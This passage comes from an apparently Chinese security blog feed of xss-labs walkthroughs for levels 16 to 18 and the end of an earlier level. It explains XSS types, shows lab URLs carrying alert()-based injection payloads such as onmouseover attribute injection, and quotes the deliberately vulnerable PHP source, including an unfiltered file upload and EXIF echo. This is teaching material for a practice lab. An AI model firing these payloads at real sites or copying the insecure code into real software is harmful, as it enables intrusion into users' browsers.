keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/jpg"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/pjpeg"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/x-png"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">// 小于 200 kb</span><span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$allowedExts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"错误：: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"上传文件名: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"文件类型: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"文件大小: "</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">" kB&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"文件临时存储的位置: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"非法的文件格式"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token variable">$exif</span> <span class="token operator">=</span> <span class="token function">exif_read_data</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$exif</span><span class="token punctuation">)</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span>这关成功后不会自动跳转。成功者<span class="token markup">&lt;a href=/level15.php?src=level15.png></span>点我进level15<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由52-53行代码可知：程序读取图片的EXIF信息后直接回显在页面中，未经任何过滤操作。</li></ul></li><li><p>未经过滤基于脚本的XSS可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞基础讲解</a></li><li><a href="https://www.zhaosimeng.cn/writeup/117.html" target="_blank" rel="noopener">xss-labs靶场通关</a></li><li><a href="https://www.runoob.com/php/php-file-upload.html" target="_blank" rel="noopener">PHP上传文件</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level18</title>
      <link href="/2020/10/27/xss-zhi-xss-labs-level18/"/>
      <url>/2020/10/27/xss-zhi-xss-labs-level18/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。<br>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>IE</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level18/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>禁用IE的XSS筛选器。【工具】-》【Internat选项】-》【安全】-》【自定义级别】-》【脚本：启动XSS筛选器】，设置为禁用。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level17/禁用IE的XSS筛选器.png" alt="禁用IE的XSS筛选器"></center></li><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level18<span class="token punctuation">.</span>php<span class="token operator">?</span>arg01<span class="token operator">=</span>a<span class="token operator">&amp;</span>arg02<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level18/注入点检测.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对参数中的预定义字符进行了转义，使用不含预定义字符的语句可以正常弹框，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level18<span class="token punctuation">.</span>php<span class="token operator">?</span>arg01<span class="token operator">=</span>a<span class="token operator">&amp;</span>arg02<span class="token operator">=</span><span class="token operator">+</span>onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level18/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level19.php?arg01=a&amp;arg02=b"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level18<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level18<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;embed src=xsf02.swf?"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"arg01"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"="</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"arg02"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" width=100% heigth=100%>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由17行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后回显到HTML页面中。</li></ul></li><li><p>所以含有的预定义字符的注入无效，但不含预定义字符构成的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript">onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞(XSS)基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level17</title>
      <link href="/2020/10/27/xss-zhi-xss-labs-level17/"/>
      <url>/2020/10/27/xss-zhi-xss-labs-level17/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。<br>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>IE</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level17/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>禁用IE的XSS筛选器。【工具】-》【Internat选项】-》【安全】-》【自定义级别】-》【脚本：启动XSS筛选器】，设置为禁用。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level17/禁用IE的XSS筛选器.png" alt="禁用IE的XSS筛选器"></center></li><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level17<span class="token punctuation">.</span>php<span class="token operator">?</span>arg01<span class="token operator">=</span>a<span class="token operator">&amp;</span>arg02<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level17/注入点检测.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对参数中的预定义字符进行了转义，使用不含预定义字符的语句可以正常弹框，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level17<span class="token punctuation">.</span>php<span class="token operator">?</span>arg01<span class="token operator">=</span>a<span class="token operator">&amp;</span>arg02<span class="token operator">=</span><span class="token operator">+</span>onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level17/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level17<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level17<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;embed src=xsf01.swf?"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"arg01"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"="</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"arg02"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" width=100% heigth=100%>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>成功后，<span class="token markup">&lt;a href=level18.php?arg01=a&amp;arg02=b></span>点我进入下一关<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由16行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后回显到HTML页面中。</li></ul></li><li><p>所以含有的预定义字符的注入无效，但不含预定义字符构成的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript">onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞(XSS)基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level16</title>
      <link href="/2020/10/27/xss-zhi-xss-labs-level16/"/>
      <url>/2020/10/27/xss-zhi-xss-labs-level16/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。<br>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level16/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token 